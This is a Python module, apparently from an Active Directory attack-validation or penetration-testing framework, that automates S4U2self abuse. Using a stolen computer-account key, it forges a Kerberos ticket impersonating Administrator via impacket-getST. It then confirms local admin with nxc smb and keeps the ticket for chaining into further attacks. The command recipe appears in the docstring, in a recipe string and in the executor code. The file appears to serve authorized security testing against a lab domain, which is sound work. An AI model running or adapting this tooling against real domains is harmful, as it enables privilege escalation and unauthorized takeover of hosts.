"""S4U2self-abuse validation executor -- T6/S2.

Control of a computer/service account's key lets you request an S4U2self ticket to
that account's OWN service as any user; because the ticket is encrypted with the key
you hold, you use it against that host's services as the impersonated (privileged)
user = LOCAL ADMIN on the machine you control. This is a protocol feature, not the
CVE-2020-17049 patch surface, so it is not patch-dependent.

    impacket-getST -self -impersonate <HVT> -altservice cifs/<self_host>
        <dom>/<computer$> -aesKey/-hashes <machine_key>      (KRB5CCNAME unset)
    nxc smb <self_host> -k --use-kcache                      (Pwn3d = LOCAL ADMIN)

Review HIGH: the terminal requires ``(Pwn3d!)`` -- a plain ``[+]`` authentication is
NOT local admin (S4U2self preserves the impersonated user's real authorization). The
success state is ``local_admin_for(<self_host>)`` (host admin), NOT ``S_computer_control``
(which is control of the AD computer OBJECT). The ccache is captured engine-only so
``produced()`` can thread it; it never reaches the receipt. Non-mutating; no rollback.
"""
from __future__ import annotations

from pathlib import Path
from typing import Any

from .. import netresolve, proof, states
from ..recommend import ParamSpec, ParamValue, values, recommended_spn
from .base import (ValidationExecutor, ExecutorContext, StepRecord, redact_argv,
                   Capability, CAP_CCACHE)
from . import _s4u_common as s4u


class S4U2SelfExecutor(ValidationExecutor):
    technique = "S4U2SELF"
    technique_class = "delegation"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = True         # PROVED on GOAD: CASTELBLACK$ -> Administrator -> Pwn3d castelblack
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset()              # dynamic: local_admin_for(self_host) via chain_eff
    recipe_ref = ("S4U2SELF = impacket-getST -self -impersonate <HVT> -altservice "
                  "cifs/<self_host> <dom>/<computer$> -aesKey/-hashes <key> -> nxc smb "
                  "<self_host> -k --use-kcache (Pwn3d = local admin; PROVED castelblack)")

    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        host = finding.host or ""
        return [
            ParamSpec(name="computer_account", kind="principal_name",
                      description="The compromised computer/service account whose key "
                                  "the operator holds (authenticates as itself).",
                      recommended=ctx.config.username or "",
                      rationale="The operator runs as the controlled machine account; "
                                "its key is the operator credential.", required=True),
            ParamSpec(name="impersonate", kind="escalation_target",
                      description="Privileged principal to impersonate (must be a LOCAL "
                                  "admin of the self host for the Pwn3d proof).",
                      recommended="Administrator",
                      rationale="Domain Administrator is a local admin by default; "
                                "override to a specific local admin per engagement."),
            ParamSpec(name="altservice", kind="spn",
                      description="Service class to request on the self host (e.g. "
                                  "cifs/<host>) for the SMB proof.",
                      recommended=recommended_spn("cifs", host) if host else "cifs/<self>",
                      rationale="cifs grants the SMB access the Pwn3d proof checks."),
            ParamSpec(name="self_host", kind="target_host",
                      description="The host the controlled account IS (local admin proven here).",
                      recommended=host,
                      rationale="The machine whose account key the operator controls."),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        principal = (params["computer_account"].value if "computer_account" in params
                     else None) or ctx.config.username or ""
        return {"domain": ctx.config.domain, "principal": principal}

    def chain_eff(self, ctx, finding) -> frozenset:
        host = (finding.host or "").strip()
        return frozenset({states.local_admin_for(host)}) if host else frozenset()

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        return [
            f"impacket-getST -self -impersonate {v['impersonate']} -altservice "
            f"{v['altservice']} <dom>/{v['computer_account']} <key>   (KRB5CCNAME unset)",
            f"nxc smb {v['self_host']} -k --use-kcache   (Pwn3d = LOCAL ADMIN)",
        ]

    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        acct, impersonate = v["computer_account"], v["impersonate"]
        altservice, self_host = v["altservice"], v["self_host"]
        out_dir = Path(ctx.output_dir); out_dir.mkdir(parents=True, exist_ok=True)
        steps: list[StepRecord] = []
        errors: list[str] = []

        def rec(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        getst_argv = ["impacket-getST", "-self", "-impersonate", impersonate,
                      "-altservice", altservice, "-dc-ip", cfg.dc_ip]
        getst_argv += s4u.getst_key_flags(cfg) + [s4u.op_auth_target(cfg, acct)]
        res = ctx.runner.run(getst_argv, timeout=cfg.tool_timeout_s,
                             env={"KRB5CCNAME": None}, cwd=str(out_dir))
        ticket = s4u.parse_ticket(res.stdout or "", out_dir)
        if ticket is None:
            reason = s4u.classify_kerberos_failure((res.stdout or "") + "\n" + (res.stderr or "")) \
                or "getST_no_ticket"
            rec("getST_self", getst_argv, res, False, note=reason)
            errors.append(reason)
            return self._result(steps, errors, None, False, acct, impersonate, self_host, reason, cfg)
        rec("getST_self", getst_argv, res, True, note="self ticket saved")

        nxc_argv = ["nxc", "smb", self_host, "-k", "--use-kcache",
                    *netresolve.nxc_kerberos_flags(cfg)]
        res = ctx.runner.run(nxc_argv, timeout=cfg.tool_timeout_s,
                             env={"KRB5CCNAME": ticket}, cwd=str(out_dir))
        out = res.stdout or ""
        # Review HIGH: LOCAL ADMIN requires Pwn3d, not a plain [+] authentication.
        pwned = bool(s4u.PWNED_RE.search(out))
        authed = bool(s4u.AUTH_RE.search(out))
        rec("nxc_access", nxc_argv, res, pwned,
            note="pwn3d" if pwned else "authenticated_not_admin" if authed else "no_access")
        if not pwned:
            if authed:
                errors.append("authenticated_not_admin")      # ticket works but not local admin
            else:
                diag = netresolve.classify_resolution_failure(cfg, self_host, out + "\n" + (res.stderr or ""))
                if diag:
                    errors.append(diag)
                errors.append("nxc_access_failed")
        classification = "local_admin" if pwned else ("authenticated_not_admin" if authed else "no_access")
        art = self._result(steps, errors, ticket, pwned, acct, impersonate, self_host, classification, cfg)
        if pwned:
            art["_composed_products"] = {"ccache": ticket, "principal": impersonate, "host": self_host}
        return art

    def produced(self, ctx, finding, params, artifact) -> list[Capability]:
        prod = artifact.get("_composed_products") or {}
        ccache, host = prod.get("ccache"), prod.get("host")
        if not artifact.get("complete") or not ccache or not host:
            return []
        return [Capability(state=states.local_admin_for(host), channel=CAP_CCACHE,
                           value=ccache, principal=prod.get("principal"))]

    def _result(self, steps, errors, ticket, ok, acct, impersonate, self_host,
                classification, cfg) -> dict:
        terminal = proof.build_terminal_fact(
            self.terminal_kind, ok=ok, impersonated=impersonate,
            predicate=(f"S4U2self-abuse as {cfg.domain}\\{acct} -> impersonate {impersonate} "
                       f"on {self_host}: {classification}"),
            proof_token=proof.proof_token("S4U2SELF", cfg.domain, acct, impersonate,
                                          self_host, classification),
            extra={"classification": classification, "self_host": self_host},
        )
        return {"steps": [s.as_step() for s in steps],
                "gate": {"classifier": "not_required", "op": None},
                "mutation": {"applied": False,
                             "rollback": {"performed": False, "method": None, "verified": True}},
                "terminal_fact": terminal, "complete": bool(ok), "errors": errors}
